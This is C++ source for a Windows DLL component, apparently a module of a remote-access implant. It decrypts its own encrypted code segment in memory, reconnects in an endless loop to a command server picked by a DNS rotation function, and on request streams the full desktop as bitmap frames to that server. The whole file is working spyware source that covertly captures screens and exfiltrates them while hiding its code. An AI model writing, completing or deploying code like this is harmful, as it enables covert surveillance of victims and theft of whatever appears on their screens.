#include "../Core/ComponentUtilities.h"
#include "../Core/PELoader.h"
#include "../Core/TcpShortDef.h"
#include <fstream>
#include <shellapi.h>
#include <sstream>
#include <array>
#include <cmath>

//Components required defines
#define COMPONENT_TYPE ClientTypes::screenCapture

#pragma section(segment_qdata, read)
store_variable(segment_qdata) QDATA_STORAGE storage { { 0 }, 1 };

HMODULE thisDll;
FILE_MUTEX_STRUCT thisLock;

int main();


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
		{
			thisDll = hinstDLL;
			srand(time(NULL));
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}

	return true;
}

void CALLBACK debug(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	// Although debug will be exported only in debug version add this checkpoint

#ifdef  _DEBUG
	main();
#endif
}

//Error code should be 1000
//This is the signature for thread function
unsigned int WINAPI coInitComponent(LPVOID lpParameter) {
	DBG("Intro ....Locking");
	thisLock = getComponentLock(thisDll);

	if (!thisLock.locked) {
		DBG("Intro ....FAILED");
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....Decrypting module in memory");

	if (!revertRelocatorChanges(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!decryptSegmentInMemory(thisDll, segment_crypt)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!rebaseModuleSegment(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....main() called");
	main();

	return 1;	//doesn't matter anymore. Just the first errors are important(for the loader)
}

//Returns version from data segment
DWORD getVersion() {
	return storage.version;
}

//Returns the component type
DWORD getType() {
	return (DWORD)COMPONENT_TYPE;
}


//Encripted side
std::array<char, 65000> buffer;

store_code(segment_crypt) void GetDesktopResolution(int& horizontal, int& vertical) {
	RECT desktop;

	// Get a handle to the desktop window
	const HWND hDesktop = GetDesktopWindow();

	// Get the size of screen to the variable desktop
	GetWindowRect(hDesktop, &desktop);

	// The top left corner will have coordinates (0,0)
	// and the bottom right corner will have coordinates
	// (horizontal, vertical)
	horizontal = desktop.right;
	vertical = desktop.bottom;
}


void setBMPInfoStructure(BITMAPINFO& bmpInfo, int screenWidth, int rowHeight, int bitCount) {
	memset(&bmpInfo, 0, sizeof(BITMAPINFO));
	bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpInfo.bmiHeader.biWidth = screenWidth;
	bmpInfo.bmiHeader.biHeight = rowHeight;
	bmpInfo.bmiHeader.biPlanes = 1;
	bmpInfo.bmiHeader.biBitCount = bitCount;
	bmpInfo.bmiHeader.biCompression = BI_RGB;
	bmpInfo.bmiHeader.biSizeImage = ((bmpInfo.bmiHeader.biWidth * bmpInfo.bmiHeader.biBitCount + 31) & ~31) / 8 * bmpInfo.bmiHeader.biHeight;
}

store_code(segment_crypt) bool netloop(HorizonClient& client) {
	std::unique_ptr<PACKET_HEADER> header(new PACKET_HEADER);

	if (!recvHeader(header.get())) return false;

	uint64_t noEntries = 0;

	switch ((PacketDataTypes)header->data_type) {
		case PacketDataTypes::video_init: {
			int screenW, screenH;

			GetDesktopResolution(screenW, screenH);

			if (!sendHeader(PacketDataTypes::video_init, 4 + 4, "")) return false;
			if (!sendData((char*)&screenW, 4)) return false;
			if (!sendData((char*)&screenH, 4)) return false;

			break;
		}
		case PacketDataTypes::video_start: {
			HDC screen = GetDC(NULL);
			HDC memHDC = CreateCompatibleDC(NULL);
			HBITMAP bmp;
			BITMAPINFO bmpInfo;
			void* imgBytes;
			int screenW, screenH;
			unsigned int framesCount;
			unsigned int rowHeight;
			unsigned int yOffset;
			TOKEN_KEY video_end_token;

			GetDesktopResolution(screenW, screenH);

			if (!recvData(buffer.data(), 8 + sizeof(header->token))) return false;

			framesCount = *(unsigned int*)buffer.data();
			rowHeight = (*(unsigned int*)(buffer.data() + 4));
			yOffset = 0;
			memcpy(video_end_token.data(), buffer.data() + 8, video_end_token.size());

			// Crop the specified row height to possible values
			if (rowHeight < 100) rowHeight = 100;
			if (rowHeight > screenH) rowHeight = screenH;

			// Initialize the bitmap structure for the screen image
			setBMPInfoStructure(bmpInfo, screenW, rowHeight, 24);

			// Create device independent object for directly handling bitmap pixels
			bmp = CreateDIBSection(memHDC, &bmpInfo, DIB_RGB_COLORS, &imgBytes, NULL, NULL);
			if (bmp == NULL) {
				DeleteDC(memHDC);
				ReleaseDC(NULL, screen);

				sendError("Could not create section");
				return false;
			}

			// Select object onto the specified DC context
			HGDIOBJ oldSelect = SelectObject(memHDC, bmp);
			if (oldSelect == NULL) {
				DeleteDC(memHDC);
				DeleteObject(bmp);
				ReleaseDC(NULL, screen);

				sendError("Could not select object");
				return false;
			}


			for (int i = 0; i < framesCount; i++) {
				yOffset = 0;

				while (true) {
					if (BitBlt(memHDC, 0, 0, screenW, rowHeight, screen, 0, yOffset, SRCCOPY) == 0) {
						SelectObject(memHDC, oldSelect);
						DeleteDC(memHDC);
						DeleteObject(bmp);
						ReleaseDC(NULL, screen);

						sendError("Could not copy image to memory");
						return false;
					}

					bool error = false;
					if (!sendHeader(PacketDataTypes::video_frame, 4 + (uint64_t)bmpInfo.bmiHeader.biSizeImage, "")) error = true;
					if (!error && !sendData((char*)&yOffset, 4)) error = true;
					if (!error && !sendData((char*)imgBytes, bmpInfo.bmiHeader.biSizeImage)) error = true;

					if (error) {
						//Restore original bitmap
						SelectObject(memHDC, oldSelect);
						DeleteDC(memHDC);
						DeleteObject(bmp);
						ReleaseDC(NULL, screen);
						return false;
					}

					yOffset += rowHeight;
					if (yOffset >= screenH) break;
					else if (screenH - yOffset < rowHeight) yOffset = screenH - rowHeight;
				}
			}

			bool error = false;

			client.setToken(video_end_token);
			if (!sendHeader(PacketDataTypes::video_end, 0, "")) error = true;

			//Restore original bitmap
			SelectObject(memHDC, oldSelect);
			DeleteDC(memHDC);
			DeleteObject(bmp);
			ReleaseDC(NULL, screen);

			if (error) return false;
			break;
		}
	}

	return true;
}

void callback_userdescriptorChanged(const USERDESCRIPTOR* new_user) {
	updateStoredDescriptor(new_user);
}

store_code(segment_crypt) int main() {
	while (true) {
		try {
			DBG("Connecting");

			std::unique_ptr<USERDESCRIPTOR> user = loadStoredDescriptor(getVersion(), COMPONENT_TYPE);
			HorizonClient client(getNextDNS(), user.get(), thisDll, callback_userdescriptorChanged);

			DBG("Connected");

			if (!client.authentificate(__LINE__)) {
				DBG("Could not authentificate");
				continue;
			}

			// Message pump
			while (true) {
				if (!netloop(client)) break;
			}
			client.closeClient();

			DBG("Connection ended");

		} catch (std::exception ex) {
			DBG("Exeption");
			DBG(ex.what());
			Sleep(1000);
		}
	}

	return 0;
}